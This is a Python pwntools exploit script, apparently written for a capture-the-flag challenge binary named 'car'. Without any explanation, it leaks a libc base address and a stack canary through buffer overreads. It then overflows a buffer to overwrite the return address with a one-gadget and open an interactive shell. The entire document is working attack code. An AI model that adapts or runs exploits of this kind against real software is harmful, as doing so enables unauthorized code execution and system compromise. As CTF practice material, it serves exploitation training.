from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)

def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x200)
add(1,0x200)
add(2,0x200)

edit(0,0x38,"A"*0x30)
p.readuntil("A"*0x30)
base=u64(p.readuntil(" g")[:-2]+'\0\0')-(0x7ffff7dd07e3-0x7ffff7a21000)
cmd(3)
edit(1,0xf9,"A"*0xf9)
p.readuntil("A"*0xf9)
canary=u64('\0'+p.read(7))
cmd(2)

p.sendlineafter(": ",str(0xf9))
p.sendafter(": ","A"*0xf8+'\x00')
cmd(3)

one=0x4161a+base
gdb.attach(p,'b *0x00055555555586E')
edit(2,0x188,"A"*0xf8+p64(canary)+p64(0xdeadbeef)+p64(one)+'\x00'*0x78)
log.warning(hex(base))
log.warning(hex(canary))
cmd(3)
p.interactive()
